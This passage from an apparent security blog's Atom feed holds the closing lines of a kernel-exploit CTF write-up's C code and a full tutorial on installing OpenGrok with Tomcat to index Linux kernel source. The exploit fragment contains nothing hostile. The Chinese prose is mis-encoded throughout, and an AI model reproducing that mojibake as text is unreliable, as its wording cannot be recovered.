class="line">        wait(<span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    close(fd2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;0x00&quot;&gt;&lt;a href=&quot;#0x00&quot; class=&quot;headerlink&quot; title=&quot;0x00:&quot;&gt;&lt;/a&gt;0x00:&lt;/h4&gt;&lt;p&gt;ä¹‹å‰å›½èµ›çš„ä¸€ä¸ªLinux kernel pwnï¼ŒAtumå¤§ä½¬çš„é¢˜ç›®ã€‚&lt;/p&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="http://o0xmuhe.me/tags/ctf/"/>
    
      <category term="linux kernel" scheme="http://o0xmuhe.me/tags/linux-kernel/"/>
    
      <category term="ctf writeup" scheme="http://o0xmuhe.me/tags/ctf-writeup/"/>
    
  </entry>
  
  <entry>
    <title>OpenGrokæ­å»º</title>
    <link href="http://o0xmuhe.me/2017/07/05/OpenGrok%E6%90%AD%E5%BB%BA/"/>
    <id>http://o0xmuhe.me/2017/07/05/OpenGrokæ­å»º/</id>
    <published>2017-07-05T04:11:51.000Z</published>
    <updated>2017-07-05T04:43:16.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="0x00-èµ·å› "><a href="#0x00-èµ·å› " class="headerlink" title="0x00: èµ·å› "></a>0x00: èµ·å› </h4><p>å·¥ä½œç¯å¢ƒæ¢åˆ°äº†macä¹‹åå¾ˆå¤šä¸œè¥¿éƒ½ä¸ä¸€æ ·äº†ã€‚æœ€è¿‘åœ¨çœ‹Linux kernelå‡ ä¸ªæ¼æ´ï¼Œéœ€è¦é˜…è¯»Linuxæºç ï¼Œç„¶è€Œåœ¨windowsä¸Šä½¿ç”¨ä¹ æƒ¯äº†source insightåï¼ŒmacOSä¸Šä¸€è„¸æ‡µé€¼ï¼Œä¸çŸ¥é“å•¥å·¥å…·å¥½ä½¿ã€‚äº†è§£åˆ°OpenGrokä¹‹åï¼Œå†³å®šæ­å»ºä¸€ä¸ªï¼Œä¸»è¦æ˜¯æ·»åŠ æºç æ–¹ä¾¿ï¼Œä¹Ÿæ–¹ä¾¿å®ç”¨ï¼Œæ„Ÿè§‰è¿˜ä¸é”™ã€‚</p>
<p>å…¶å®vimæˆ–è€…sublè¿™ç±»ç¼–è¾‘å™¨çœ‹æºç ä¹Ÿå¯ä»¥ï¼Œåªæ˜¯æˆ‘è¿˜æ²¡ä¹ æƒ¯ã€‚æ‰€ä»¥å°±å…ˆOpenGrokå•¦ï½</p>
<a id="more"></a>
<h4 id="0x01-å‡†å¤‡å·¥ä½œ"><a href="#0x01-å‡†å¤‡å·¥ä½œ" class="headerlink" title="0x01: å‡†å¤‡å·¥ä½œ"></a>0x01: å‡†å¤‡å·¥ä½œ</h4><p>æ ¹æ®githubä¸Šé¡¹ç›®çš„wikiå¯çŸ¥ï¼Œéœ€è¦çš„å‡†å¤‡å·¥ä½œå¦‚ä¸‹ï¼š</p>
<ul>
<li>JDK 1.8 or higher</li>
<li>{OpenGrok binaries from <a href="https://github.com/OpenGrok/OpenGrok/releases" target="_blank" rel="noopener">https://github.com/OpenGrok/OpenGrok/releases</a> (either the package for Solaris, or .tar.gz with binaries, NOT the src !)</li>
<li>Exuberant Ctags for analysis (<a href="https://github.com/universal-ctags" target="_blank" rel="noopener">https://github.com/universal-ctags</a> is recommended)</li>
<li>A servlet container like GlassFish or Tomcat (8.x or later) also running with java at least 1.8</li>
<li>If history is needed, appropriate binary (in some cases also cvs/svn repository) must be present on the system (e.g. Subversion or Mercurial or SCCS or â€¦ )</li>
<li>2GB of memory for indexing process using OpenGrok script (can use less, this is scaled for bigger deployments)</li>
<li>a recent browser for clients - IE, Firefox, recent Chrome or Safari<br>sufficient ULIMIT settings (refer to README)</li>
</ul>
<p>æˆ‘åœ¨è‡ªå·±æœåŠ¡å™¨ä¸Šæ­å»ºçš„ï¼Œç³»ç»Ÿæ˜¯ubuntuï¼Œåœ¨å®‰è£…äº†jdk8ä¹‹åï¼Œå»ä¸‹è½½äº†tomcatå’Œopengrokçš„åŒ…ã€‚<br>è¿™é‡Œè¯´ä¸ªé¢˜å¤–è¯ï¼Œä½¿ç”¨apt-getæ–¹å¼å®‰è£…çš„tomcat8å¾ˆå¥‡æ€ªï¼ŒæœåŠ¡èµ·æ¥äº†ï¼Œä½†æ˜¯curlè®¿é—®æœ¬åœ°8080çš„æ—¶å€™ï¼Œæ²¡å›åº”ï¼Œæ‰€ä»¥æˆ‘æœ€åå»å®˜ç½‘ä¸‹è½½äº†ä¸€ä¸ªtomcatçš„åŒ…ã€‚</p>
<h4 id="0x02ï¼šè¿‡ç¨‹"><a href="#0x02ï¼šè¿‡ç¨‹" class="headerlink" title="0x02ï¼šè¿‡ç¨‹"></a>0x02ï¼šè¿‡ç¨‹</h4><pre><code>å¦‚æœæ˜¯å¾ˆå¤šäººç”¨ï¼Œæ¨èä¸“é—¨åˆ›å»ºä¸€ä¸ªç”¨æˆ·ï¼Œåšå¥½æƒé™çš„éš”ç¦»ï¼Œä¸ªäººä½¿ç”¨çš„è¯æ— æ‰€è°“äº†ã€‚
</code></pre><h6 id="å‡†å¤‡å·¥ä½œ"><a href="#å‡†å¤‡å·¥ä½œ" class="headerlink" title="å‡†å¤‡å·¥ä½œ"></a>å‡†å¤‡å·¥ä½œ</h6><ul>
<li>æ‰¾ä¸€ä¸ªç›®å½•ï¼ŒæŠŠä¸‹è½½æ¥çš„tomcatå’Œopengrokè§£å‹äº†ã€‚</li>
<li>å¯åŠ¨tomcatï¼Œç„¶åè®¿é—®<code>http://127.0.0.1:8080</code>ï¼Œç¡®å®štomcatæ­£å¸¸å·¥ä½œã€‚</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@VM-64-163-ubuntu:~$ ./apache-tomcat-8.5.16/bin/startup.sh</span><br></pre></td></tr></table></figure>
<ul>
<li>ä¸ºé¡¹ç›®åˆ›å»ºç›®å½•ï¼Œæ‹¿æˆ‘è‡ªå·±çš„ä¸¾ä¾‹å­ï¼š</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">path/to/your/opengrok_projects/prj1</span><br></pre></td></tr></table></figure>
<p>ç›®å½•ç»“æ„å¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">path/to/your/opengrok_projects/prj1</span><br><span class="line">                        |-----/prj2</span><br><span class="line">                        |-----/prj3</span><br></pre></td></tr></table></figure>
<h6 id="éƒ¨ç½²opengrok"><a href="#éƒ¨ç½²opengrok" class="headerlink" title="éƒ¨ç½²opengrok"></a>éƒ¨ç½²opengrok</h6><ul>
<li>éƒ¨ç½²</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">OPENGROK_TOMCAT_BASE=path/to/apache-tomcat path/to/opengrok/bin/OpenGrok deploy</span><br></pre></td></tr></table></figure>
<ul>
<li>åˆ›å»ºç´¢å¼•</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">OPENGROK_VERBOSE=<span class="literal">true</span> OPENGROK_INSTANCE_BASE=./opengrok_data ./opengrok-1.1-rc5/bin/OpenGrok  index ./opengrok_projects</span><br></pre></td></tr></table></figure>
<p>åˆ›å»ºç´¢å¼•æ—¶ï¼Œä¼šåˆ›å»ºä¸‰ä¸ªç›®å½•ï¼Œä¸€ä¸ªdataç›®å½•æ¥å­˜æ”¾ç´¢å¼•ä¿¡æ¯ï¼Œä¸€ä¸ªetcç›®å½•åˆ›å»ºé…ç½®ä¿¡æ¯å’Œä¸€ä¸ªlogç›®å½•ã€‚</p>
<ul>
<li>ä¿®æ”¹é…ç½®æ–‡ä»¶</li>
</ul>
<p>åœ¨<code>path/to/apache-tomcat/webapps/source/WEB-INF</code>ç›®å½•ä¸‹çš„<code>web.xml</code>æ–‡ä»¶</p>
<p>æŠŠ</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">context-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>CONFIGURATION<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>/var/opengrok/etc/configuration.xml<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>Full path to the configuration file where OpenGrok can read it's configuration<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">context-param</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>ä¸­çš„<code>/var/opengrok/etc/configuration.xml</code><br>ä¿®æ”¹æˆå¯¹åº”çš„opengrokçš„<code>path/to/opengrok/data/etc/configuration.xml</code></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">context-param</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">description</span>&gt;</span>Full path to the configuration file where OpenGrok can read its configuration<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>CONFIGURATION<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>/home/ubuntu/opengrok_data/etc/configuration.xml<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">context-param</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>æˆ‘è¿™é‡Œæ˜¯è¿™ä¸ªæ ·å­çš„ã€‚</p>
<ul>
<li>æŠŠæºç æ”¾è¿›projectç›®å½•</li>
</ul>
<p>æˆ‘è¿™é‡Œæ”¾çš„æ˜¯linux-3.18.1çš„æºç ã€‚ä»¥åå¦‚æœæƒ³æ›´æ–°çš„è¯ï¼Œç›´æ¥æ”¾è¿›å»ï¼Œç„¶åé‡æ–°ç”Ÿæˆç´¢å¼•å°±å¥½äº†ã€‚</p>
<h4 id="0x03-æ•ˆæœ"><a href="#0x03-æ•ˆæœ" class="headerlink" title="0x03:æ•ˆæœ"></a>0x03:æ•ˆæœ</h4><p><img src="http://blogimg-10065924.cossh.myqcloud.com/opengrok_build/QQ20170705-123540%402x.png" alt=""></p>
<h4 id="0x04-å‚è€ƒ"><a href="#0x04-å‚è€ƒ" class="headerlink" title="0x04:å‚è€ƒ"></a>0x04:å‚è€ƒ</h4><p><a href="https://github.com/OpenGrok/OpenGrok/wiki/How-to-install-OpenGrok" target="_blank" rel="noopener">wiki</a></p>
<p><a href="https://github.com/crazygit/temp/blob/master/setup_opengrok.md" target="_blank" rel="noopener">OpenGrokå®‰è£…ä½¿ç”¨æŒ‡å—</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;0x00-èµ·å› &quot;&gt;&lt;a href=&quot;#0x00-èµ·å› &quot; class=&quot;headerlink&quot; title=&quot;0x00: èµ·å› &quot;&gt;&lt;/a&gt;0x00: èµ·å› &lt;/h4&gt;&lt;p&gt;å·¥ä½œç¯å¢ƒæ¢åˆ°äº†macä¹‹åå¾ˆå¤šä¸œè¥¿éƒ½ä¸ä¸€æ ·äº†ã€‚æœ€è¿‘åœ¨çœ‹Linux kernelå‡ ä¸ªæ¼æ´ï¼Œéœ€è¦é˜…è¯»Linuxæºç ï¼Œç„¶è€Œåœ¨windowsä¸Šä½¿ç”¨ä¹ æƒ¯äº†source insightåï¼ŒmacOSä¸Šä¸€è„¸æ‡µé€¼ï¼Œä¸çŸ¥é“å•¥å·¥å…·å¥½ä½¿ã€‚äº†è§£åˆ°OpenGrokä¹‹åï¼Œå†³å®šæ­å»ºä¸€ä¸ªï¼Œä¸»è¦æ˜¯æ·»åŠ æºç æ–¹ä¾¿ï¼Œä¹Ÿæ–¹ä¾¿å®ç”¨ï¼Œæ„Ÿè§‰è¿˜ä¸é”™ã€‚&lt;/p&gt;
&lt;p&gt;å…¶å®vimæˆ–è€…sublè¿™ç±»ç¼–è¾‘å™¨çœ‹æºç ä¹Ÿå¯ä»¥ï¼Œåªæ˜¯æˆ‘è¿˜æ²¡ä¹ æƒ¯ã€‚æ‰€ä»¥å°±å…ˆOpenGrokå•¦ï½&lt;/p&gt;
    
    </summary>
    
    
      <category term="ç¯å¢ƒé…ç½®" scheme="http://o0xmuhe.me/tags/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"/>
    
      <category term="å·¥å…·" scheme="http://o0xmuhe.me/tags/%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
</feed>
